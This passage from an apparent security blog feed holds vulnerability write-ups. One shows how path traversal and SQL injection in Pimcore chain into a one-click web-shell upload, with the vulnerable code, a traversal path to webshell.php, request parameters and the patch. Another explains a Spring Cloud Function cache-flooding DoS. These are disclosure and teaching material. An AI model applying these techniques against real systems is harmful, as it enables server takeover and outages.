upgrading?</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>Are there any links users can visit to find out more?</p><ul><li><a href="https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-gm68-572p-q28r">GHSA-gm68-572p-q28r</a></li><li><a href="https://github.com/vendure-ecommerce/vendure/commit/0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0">vendure-ecommerce&#x2F;vendure@0cdc92b</a></li><li><a href="https://github.com/vendure-ecommerce/vendure/blob/master/CHANGELOG.md#203-2023-07-04">https://github.com/vendure-ecommerce/vendure/blob/master/CHANGELOG.md#203-2023-07-04</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Impact&quot;&gt;&lt;a href=&quot;#Impact&quot; class=&quot;headerlink&quot; title=&quot;Impact&quot;&gt;&lt;/a&gt;Impact&lt;/h2&gt;&lt;p&gt;Vendure provides an authorization system with differen</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>Pimcore: One click, two security vulnerabilities</title>
    <link href="https://yaniv-git.github.io/2023/05/15/Pimcore-%20One%20click,%20two%20security%20vulnerabilities/"/>
    <id>https://yaniv-git.github.io/2023/05/15/Pimcore-%20One%20click,%20two%20security%20vulnerabilities/</id>
    <published>2023-05-15T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>The Pimcore Platform provides software for central management of corporate data. With over 100,000 clients across 56 countries, including some major vendors, it has become a trusted choice for businesses worldwide. Available in both an Enterprise subscription as well as an Open Source Community Edition with a growing community of developers and users.</p><p>We make a consistent effort to enhance the technology powering our Clean Code solution by frequently scanning open-source projects and assessing the outcomes. In the case of Pimcore, our engine reported an interesting limited directory traversal vulnerability. After analyzing the finding we found an additional SQL Injection vulnerability in the same endpoint. Leveraging those two vulnerabilities, an admin that clicks on an attacker’s crafted link will execute arbitrary code on the server.</p><h1 id="Pimcore-Vulnerabilities-Impact"><a href="#Pimcore-Vulnerabilities-Impact" class="headerlink" title="Pimcore Vulnerabilities Impact"></a>Pimcore Vulnerabilities Impact</h1><p>Pimcore versions prior to 10.5.19 are susceptible to both a <strong>path traversal</strong> and an <strong>SQL injection</strong> vulnerability in the <code>create-csv</code> endpoint tracked as CVE-2023-28438. The two vulnerabilities can be exploited with a single GET request. Because of this, an attacker can create a malicious link, which can cause the <strong>execution of arbitrary code</strong> when accessed by an admin. </p><iframe width="100%" height="414" src="https://www.youtube.com/embed/7ODgHHyhuqg" title="Demonstration of Pimcore vulnerabilities on a test instance" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In this section, we will discuss the technical details of the vulnerabilities and explain how an attacker could combine them to create a one-click exploit that will deploy a web shell on the server.</p><h2 id="Limited-Arbitrary-File-Write-and-Path-Traversal"><a href="#Limited-Arbitrary-File-Write-and-Path-Traversal" class="headerlink" title="Limited Arbitrary File Write and Path Traversal"></a>Limited Arbitrary File Write and Path Traversal</h2><p>Scanning Pimcore with SonarCloud uncovered an interesting path traversal issue caused by passing user-controlled data as the filename parameter of <code>fopen</code>. You can inspect the finding directly on SonarCloud:</p><p><a href="https://sonarcloud.io/project/issues?resolved=false&types=VULNERABILITY&id=SonarSourceResearch_pimcore-blogpost&open=AYbwBqEGzBX2hF8LIsrC&_gl=1*h7icnc*_gcl_au*OTE1ODQ0MTAxLjE2OTg1MTM1NzM.*_ga*MTIwOTcxMTcxNi4xNjk4NTEzNTcz*_ga_9JZ0GZ5TC6*MTY5ODU5NTQzMS4yLjEuMTY5ODU5NTQ3Ny4xNC4wLjA.">Try it by yourself on SonarCloud!</a></p><p>The underlined feature is in the admin panel of Pimcore which enables the display of statistical reports on various aspects of the website. An admin can create custom reports, view them directly from the panel, or download the data in CSV format:</p><img src="/img/blogs/pimcore/image1.webp" style="width: 100%;"/><p>Upon further inspection of the vulnerable function <code>createCsvAction</code>, we found out that the user-controlled data is passed through the <code>admin/reports/custom-report/create-csv</code> endpoint’s <code>exportFile</code> parameter. Although this endpoint is only accessible by admins, it is a GET request endpoint with no CSRF protection, thus manipulating an admin to click on a link is enough.</p><p>The value of the <code>exportFile</code> parameter is appended to the web root path without prior sanitization, allowing an attacker to control the extension as well as traverse back in the folder path. </p><p>On continued inspection of the code, we can see that the user-controlled path will end up opening a file in “append” mode. Writing the <code>getData</code> function’s output to it using <code>fputcsv</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCsvAction</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">       <span class="variable">$filters</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filter&#x27;</span>) ? <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filter&#x27;</span>)), <span class="literal">true</span>) : <span class="literal">null</span>;</span><br><span class="line">       <span class="variable">$drillDownFilters</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;drillDownFilters&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">       <span class="variable">$result</span> = <span class="variable">$adapter</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$filters</span>, <span class="variable">$sort</span>, <span class="variable">$dir</span>, <span class="variable">$offset</span> * <span class="variable">$limit</span>, <span class="variable">$limit</span>, <span class="variable">$fields</span>, <span class="variable">$drillDownFilters</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(<span class="variable">$exportFile</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;exportFile&#x27;</span>))) &#123;</span><br><span class="line">           <span class="variable">$exportFile</span> = PIMCORE_SYSTEM_TEMP_DIRECTORY . <span class="string">&#x27;/report-export-&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.csv&#x27;</span>;</span><br><span class="line">           @<span class="title function_ invoke__">unlink</span>(<span class="variable">$exportFile</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$exportFile</span> = PIMCORE_SYSTEM_TEMP_DIRECTORY.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$exportFile</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$exportFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$includeHeaders</span>) &#123;</span><br><span class="line">           <span class="title function_ invoke__">fputcsv</span>(<span class="variable">$fp</span>, <span class="variable">$fields</span>, <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$result</span>[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">           <span class="variable">$row</span> = <span class="title class_">Service</span>::<span class="title function_ invoke__">escapeCsvRecord</span>(<span class="variable">$row</span>);</span><br><span class="line">           <span class="title function_ invoke__">fputcsv</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$row</span>), <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/pimcore/pimcore/blob/928a964c13a5c9992cff4b5abdb25847529604d3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L422%C2%A0">File in Github</a></p><p>Up until now, an attacker can control the CSV output file path, name, and extension. Although this allows the creation of PHP files on the server, an attacker will need to control the file content as well in order to execute arbitrary code. Here enters the second vulnerability, an SQL Injection in the <code>getData</code> function.</p><h2 id="1st-SQL-Injection-sink"><a href="#1st-SQL-Injection-sink" class="headerlink" title="1st SQL Injection sink"></a>1st SQL Injection sink</h2><p>Looking at the <code>createCsvAction</code> function from earlier, the inputs an attacker can control are <code>$drillDownFilters</code> and <code>$filters</code>, which are passed on to <code>getBaseQuery</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$sort</span>, <span class="variable">$dir</span>, <span class="variable">$offset</span>, <span class="variable">$limit</span>, <span class="variable">$fields</span> = <span class="literal">null</span>, <span class="variable">$drillDownFilters</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$db</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">get</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="variable">$baseQuery</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBaseQuery</span>(<span class="variable">$filters</span>, <span class="variable">$fields</span>, <span class="literal">false</span>, <span class="variable">$drillDownFilters</span>);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$baseQuery</span>) &#123;</span><br><span class="line">          <span class="variable">$total</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">fetchOne</span>(<span class="variable">$baseQuery</span>[<span class="string">&#x27;count&#x27;</span>]);</span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="variable">$sql</span> = <span class="variable">$baseQuery</span>[<span class="string">&#x27;data&#x27;</span>] . <span class="variable">$order</span>;</span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">fetchAllAssociative</span>(<span class="variable">$sql</span>);</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L29">File in Github</a></p><p>Two SQL queries are issued with the result of the <code>getBaseQuery</code> function:</p><ol><li><code>$baseQuery[‘count’]</code>: a query that returns the number of results using <code>COUNT(*)</code> will be used in <code>$db-&gt;fetchOne</code>.</li><li><code>$baseQuery[‘data’]</code>: will end up in <code>$db-&gt;fetchAllAssociative</code> and fetch the results.</li></ol><p>This is how the <code>getBaseQuery</code> function that prepares those two queries looks like:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getBaseQuery</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$fields</span>, <span class="variable">$ignoreSelectAndGroupBy</span> = <span class="literal">false</span>, <span class="variable">$drillDownFilters</span> = <span class="literal">null</span>, <span class="variable">$selectField</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildQueryString</span>(<span class="variable">$this</span>-&gt;config, <span class="variable">$ignoreSelectAndGroupBy</span>, <span class="variable">$drillDownFilters</span>, <span class="variable">$selectField</span>);</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">                   <span class="variable">$operator</span> = <span class="variable">$filter</span>[<span class="string">&#x27;operator&#x27;</span>];</span><br><span class="line">                   <span class="comment">//..</span></span><br><span class="line">                   <span class="keyword">switch</span> (<span class="variable">$operator</span>) &#123;</span><br><span class="line"><span class="comment">//..</span></span><br><span class="line">                       <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">                           <span class="variable">$fields</span>[] = <span class="variable">$filter</span>[<span class="string">&#x27;property&#x27;</span>];</span><br><span class="line">                           <span class="variable">$condition</span>[] = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">quoteIdentifier</span>(<span class="variable">$filter</span>[<span class="string">&#x27;property&#x27;</span>]) . <span class="string">&#x27; = &#x27;</span> . <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">quote</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">           <span class="variable">$total</span> = <span class="string">&#x27;SELECT COUNT(*) FROM (&#x27;</span> . <span class="variable">$sql</span> . <span class="string">&#x27;) AS somerandxyz WHERE &#x27;</span> . <span class="variable">$condition</span>;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$fields</span> &amp;&amp; !<span class="variable">$extractAllFields</span>) &#123;</span><br><span class="line">               <span class="variable">$data</span> = <span class="string">&#x27;SELECT `&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;`,`&#x27;</span>, <span class="variable">$fields</span>) . <span class="string">&#x27;` FROM (&#x27;</span> . <span class="variable">$sql</span> . <span class="string">&#x27;) AS somerandxyz WHERE &#x27;</span> . <span class="variable">$condition</span>;</span><br><span class="line">           &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="keyword">return</span> [</span><br><span class="line">           <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">           <span class="string">&#x27;count&#x27;</span> =&gt; <span class="variable">$total</span>,</span><br><span class="line">       ];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L150">File in Github</a></p><p>At first glance, we noticed an injection at the <code>$data</code> parameter, the SQL query’s <code>SELECT</code> fields are not sanitized. The <code>implode(&#39;`,`&#39;, $fields)</code> can simply be escaped with backticks.</p><p>In order to control the <code>$fields</code> parameter we need to set the <code>$filters[&#39;operator&#39;]</code> attribute accordingly (in the code snippet only ‘&#x3D;’ is shown but there are other options) and then the <code>&#39;property&#39;</code> attribute will be appended to it. Immediately after a <code>$condition</code> string will be created. So in order to control the <code>$fields</code> value the <code>$condition</code> string will be present. </p><p>However, while it seems like there is a simple SQL injection at <code>$data</code>, the <code>$condition</code> variable is concatenated to the end of both queries (<code>count</code> and <code>data</code>). And due to the quotation escaping (done using the functions <code>$db-&gt;quoteIdentifier</code> and <code>$db-&gt;quote</code>), any field containing a backtick character (&#96;) will be doubled and thus making the query’s syntax invalid.</p><p>We can of course comment out the rest of the query (using <code>--</code> or <code>;</code>) to avoid the syntax breaking <code>$condition</code>. But the <code>$total</code> query also has the broken <code>$condition</code>, and later be used in the line <code>$db-&gt;fetchOne($baseQuery[&#39;count&#39;])</code> before fetching with the SQL Injected <code>data</code> query, thus raising an exception and not executing the SQL Injection.</p><h2 id="2nd-SQL-Injection-sink"><a href="#2nd-SQL-Injection-sink" class="headerlink" title="2nd SQL Injection sink"></a>2nd SQL Injection sink</h2><p>So we have an SQL Injection, but exploiting it will always cause a syntax error. Is there any other way to somehow ignore the <code>$condition</code> string?</p><p>Some of you probably already noticed that before every <code>$condition</code> there is the <code>$sql</code> parameter, which is returned from <code>$this-&gt;getBaseQuery(...)</code>. If there is an SQL Injection in that function as well we can end the query before the syntax error.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildQueryString</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$ignoreSelectAndGroupBy</span> = <span class="literal">false</span>, <span class="variable">$drillDownFilters</span> = <span class="literal">null</span>, <span class="variable">$selectField</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$drillDownFilters</span>) &#123;</span><br><span class="line">           <span class="variable">$havingParts</span> = [];</span><br><span class="line">           <span class="variable">$db</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">get</span>();</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$drillDownFilters</span> <span class="keyword">as</span> <span class="variable">$field</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="variable">$value</span> !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$value</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="variable">$havingParts</span>[] = <span class="string">&quot;<span class="subst">$field</span> = &quot;</span> . <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">quote</span>(<span class="variable">$value</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$havingParts</span>) &#123;</span><br><span class="line">               <span class="variable">$sql</span> .= <span class="string">&#x27; HAVING &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; AND &#x27;</span>, <span class="variable">$havingParts</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Auditing the <code>buildQueryString</code> function we found another SQL Injection sink but now using the <code>$drillDownFilters</code> parameter. Though the value is being quoted, the field isn’t. An attacker can use this sync to comment out the broken <code>$condition</code> and execute arbitrary SQL queries.</p><h1 id="Exploitation-connecting-everything-together"><a href="#Exploitation-connecting-everything-together" class="headerlink" title="Exploitation - connecting everything together"></a>Exploitation - connecting everything together</h1><p>So an attacker can control the output file and inject SQL to the function that fetches results which will end up in that file. Having the export file path pointing to a PHP file in the web root is straightforward using: </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span><span class="keyword">var</span><span class="regexp">/www/</span>html<span class="regexp">/public/</span>webshell.php</span><br></pre></td></tr></table></figure><p>A PHP file will execute also if there is the PHP declaration randomly in the file, meaning a file doesn’t have to start with <code>&lt;?php</code>, so we don’t have to worry about that. </p><p>But how can an attacker exploit the SQL Injection to result in arbitrary content?</p><p>Having multiple queries, one that inserts custom data and another that fetches it is possible but makes the exploit more complicated. Going back to our SQL query, the injection is in the SELECT fields, so we can use the <a href="https://www.w3schools.com/sql/sql_case.asp">CASE expression</a>.</p><p>Lastly, there are two parameters needed for the get request: </p><ul><li><code>headers=true</code> is to output the field names to the CSV</li><li><code>name=Quality_Attributes</code> is a default name of a report from the demo app (in order to execute the vulnerable function the name has to be a valid report)</li></ul><p>Combining those 2 vulnerabilities from 3 sinks in 1 GET request an attacker could create a malicious link that will deploy a web shell on the server.</p><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>Both vulnerabilities were fixed in Pimcore version 10.5.19:</p><ul><li>The SQL Injection was fixed by adding db-&gt;quoteIdentifier(…) in the field name as well.<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$havingParts</span>[] = (<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">quoteIdentifier</span>(<span class="variable">$field</span>) .<span class="string">&quot; = &quot;</span> . <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">quote</span>(<span class="variable">$value</span>));</span><br></pre></td></tr></table></figure></li><li>The path traversal was fixed by:<ul><li>Verifying that the extension is “.csv”</li><li>Normalizing the path to prevent traversing <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exportFileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$exportFileName</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">str_ends_with</span>(<span class="variable">$exportFileName</span>, <span class="string">&quot;.csv&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="variable">$exportFileName</span> . <span class="string">&quot; is not a valid csv file.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> PIMCORE_SYSTEM_TEMP_DIRECTORY . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$exportFileName</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-02-20</td><td>We reported all issues to Vendor</td></tr><tr><td>2023-03-15</td><td>Vendor released patch version 10.5.19</td></tr><tr><td>2023-03-22</td><td>CVE-2023-28438 and <a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-vf7q-g2pv-jxvx">security advisory</a> released</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>The focus of our blog post was on our success in identifying and utilizing two distinct vulnerabilities with a single GET request, ultimately leading to code execution. This serves as a powerful demonstration of our product’s capability to detect security flaws, and we also highlighted the step-by-step process we followed from analyzing the results to creating a weaponized exploit.</p><p>We would like to thank the maintainers again for the quick response and for handling the situation professionally.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;The Pimcore Platform provides </summary>
      
    
    
    
    
    <category term="php" scheme="https://yaniv-git.github.io/tags/php/"/>
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="sqli" scheme="https://yaniv-git.github.io/tags/sqli/"/>
    
    <category term="path traversal" scheme="https://yaniv-git.github.io/tags/path-traversal/"/>
    
  </entry>
  
  <entry>
    <title>Spring Function Cloud DoS (CVE-2022-22979) and Unintended Function Invocation</title>
    <link href="https://yaniv-git.github.io/2022/06/26/Spring%20Function%20Cloud%20DoS%20(CVE-2022-22979)%20and%20Unintended%20Function%20Invocation/"/>
    <id>https://yaniv-git.github.io/2022/06/26/Spring%20Function%20Cloud%20DoS%20(CVE-2022-22979)%20and%20Unintended%20Function%20Invocation/</id>
    <published>2022-06-26T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>The Spring Framework application provides a flexible and comprehensive method for programming and configuring Java-based enterprise applications. One of the main purposes of Spring is to relieve developers from many infrastructural tasks so they can focus on writing application business logic.</p><p>Spring consists of many projects and frameworks (that contain subprojects) where each one has its own objective and can be easily integrated into a larger Spring application. In our research, we focused</p><p>on the <a href="https://spring.io/projects/spring-cloud">Spring Cloud framework</a> and specifically on the <a href="https://spring.io/projects/spring-cloud-function">Spring cloud function project</a>, which resulted in the findings of a denial of service (DoS) vulnerability and an unintended function invocation. The Cloud framework provides tools for developers to write their applications in a distribution environment, with technologies such as routing, load-balancing, circuit breakers, and more.</p><p>The function project opens an API (via a web endpoint, a stream processor, or a task) to run specific functions which fit a Spring Bean definition, reducing development overhead and boilerplate by mapping the function directly to a route.</p><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>Now that we are familiar with the purpose of the project, let’s take a deep dive into the features and code functionality.<br>The web endpoint provides two methods to invoke functions:</p><ol><li>Via the URI ‘&#x2F;functionRoute’, where the invoked bean function name is provided in one of the headers: spring.cloud.function.routing-expression &#x2F; spring.cloud.function.definition.</li><li>Or have the name of the function in the URI itself - for example <a href="http://host/function_name">http://host/function_name</a>.</li></ol><p>Both will end up invoking the same vulnerable function, but we will use the latter in the examples since it is simpler to demonstrate.</p><p>An interesting mechanism is in case the function input’s is an object. Spring will try to construct the object (only if it has a default&#x2F;nullary constructor) and expose the setters to the user’s input. For instance, we have the function “isBigTree” which gets an object Tree that has a default&#x2F;nullary constructor and a setter “setHeight”. We can call the function via POST to <a href="http://host/isBigTree">http://host/isBigTree</a> using the payload {‘height’:50}, the function will receive a Tree object with the height &#x3D; 50.</p><p>In addition, there is a feature that enables us to chain multiple functions which will be executed one after the other (and pass the output of one as an input to the next one) via the ‘,’ or ‘|’ char. For example, the URL <a href="http://host/function_a,function_b">http://host/function_a,function_b</a>, will run function_a and pass its output as an input to function_b. </p><p>So, let’s say function_b receives an object without a default&#x2F;nullary constructor, we couldn’t call it directly, but in case function_a’s output is the same object type we can chain those functions together.</p><h1 id="Denial-of-Service-DoS-Flooding-The-Function-Router"><a href="#Denial-of-Service-DoS-Flooding-The-Function-Router" class="headerlink" title="Denial-of-Service (DoS) - Flooding The Function Router"></a>Denial-of-Service (DoS) - Flooding The Function Router</h1><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>The function name from the URL will end up in the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103">lookup</a> function which will try to determine and retrieve the function itself. The lookup function has a ‘cache’ mechanism that caches functions that have already been invoked in order to save time on subsequent lookups.</p><img src="/img/blogs/spring-function-cloud/Image-1.png" style="width: 100%;"/><p>The check if the function is in the cache is done in the doLookup call (<a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L114">line 114</a>). In case the function is null, indicating it is not in the cache, the process of retrieving the function is performed. After finding the function the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158">register</a> call will add the function to the cache (<a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L148">line 148</a>).</p><p>Knowing the feature discussed before, the splitting of functions via the characters ‘,’ or ‘|’ is done after the cache check and before the insertion of a new lookup result (the red square, <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L118">line 118</a>), which means that calling a function with ‘,’ or ‘|’ at the end will add it to the cache even if all chained functions are already in it. So, we can populate a list with endless permutations of known functions, all of whom will be added to the router. Flooding the router with XXX results will eventually slow down the server, resulting in significant delay and eventual timeouts, and will inevitably crash the application by exhausting memory.  Even with the spring-boot-starter-security dependency (which 